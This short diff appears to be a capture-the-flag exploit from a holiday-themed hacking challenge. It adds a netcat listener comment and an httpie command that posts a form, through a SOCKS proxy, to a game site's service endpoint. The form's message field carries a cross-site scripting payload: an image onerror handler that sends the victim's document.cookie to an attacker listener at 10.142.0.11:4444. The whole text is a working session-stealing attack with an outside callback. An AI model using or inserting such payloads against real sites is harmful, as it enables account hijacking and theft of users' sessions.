@@ -1,0 +1,5 @@
+# nc -v -l -p 4444 on l2s
+http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
+uid=alabaster.snowball \
+email=alabaster.snowball@northpolechristmastown.com \
+message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+document.cookie\"></img>"
